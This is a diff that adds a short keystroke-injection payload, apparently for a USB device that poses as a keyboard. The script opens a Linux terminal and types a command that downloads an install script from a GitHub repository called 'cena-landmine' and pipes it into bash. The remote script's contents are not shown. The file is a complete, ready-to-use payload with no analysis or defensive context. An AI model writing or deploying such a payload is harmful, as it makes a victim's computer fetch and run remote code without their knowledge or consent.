@@ -1,0 +1,6 @@
+DEFAULTCHARDELAY 200
+DELAY 2000
+CTRL ALT t
+DELAY 5000
+STRING curl -fsSL https://raw.githubusercontent.com/Ocanath/cena-landmine/master/scripts/install_linux.sh | bash
+ENTER
